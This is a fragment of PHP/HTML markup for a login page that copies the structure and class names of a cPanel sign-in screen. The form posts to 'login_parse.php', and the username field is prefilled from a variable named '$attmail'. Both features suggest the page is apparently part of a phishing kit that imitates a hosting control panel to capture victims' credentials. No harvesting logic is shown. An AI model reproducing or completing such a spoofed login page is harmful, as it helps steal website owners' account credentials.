...
</head><body class="cp"><div id="preload_images"></div>
          ...
          <div id="login-container">
              ...
              <div id="login-sub-container">
                      ...
                      <div id="login-sub">
                          ...
                          <div id="forms">
                              <form novalidate="" id="login_form" action="login_parse.php" method="post" target="_top" style="visibility:">
                                  <div class="input-req-login"><label for="user">Username</label></div>
                                  <div class="input-field-login icon username-container">
                                      <input name="user" id="user" autofocus="autofocus" value="<?php echo $attmail; ?>"  class="std_textbox" type="text" tabindex="1" >
                                  </div>
